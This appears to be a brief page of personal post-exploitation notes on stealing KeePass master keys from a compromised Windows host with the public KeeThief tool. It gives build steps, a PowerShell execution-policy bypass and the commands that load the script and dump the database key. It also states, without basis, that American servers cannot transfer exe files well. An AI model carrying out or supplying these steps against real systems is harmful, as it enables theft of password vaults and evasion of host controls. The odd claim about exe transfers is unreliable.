<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>BypassingDefender (POSTExploit) keepass</title>
</head><body><tt>Post Exploitation for bypassing windows defender<br/>
<br/>
Applications -keytheft (dumps keepass)<ul><li style="list-style-type: none">We will be doing this in an environment without powershell / windows AV</li>
<li style="list-style-type: none"/>
</ul>
<a href="https://github.com/GhostPack/KeeThief">https://github.com/GhostPack/KeeThief</a><br/>
<br/>
<br/>
<b>Bypass PowerShell Restrictions Dump Root Password From KeePass</b><br/>
<br/>
1. Open &quot;KeeTheft.sln&quot; in visual studio<br/>
2. Build it <br/>
<br/>
../../../KeeTheft/bin/xxx<br/>
<img height="219" src="image.png" width="600"/><br/>
<br/>
So lets break down the first display of this attack<ul><li style="list-style-type: none">Below powershell is loaded with</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">&gt; powershell.exe -ExecutionPolicy Bypass</li>
</ul>
</li>
<li style="list-style-type: none">Then keythief is loaded rather than executed - Execution probably won't work all that well on USA hosts (American servers generally cant tranfer exe files well)</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">*load it*</li>
<li style="list-style-type: none">&gt; . &quot;.\KeeThief.ps1&quot;</li>
<li style="list-style-type: none">&gt; Get-KeePassDatabaseKey</li>
</ul>
</li>
</ul>
<br/>
<img src="image 2.png"/></tt></body></html>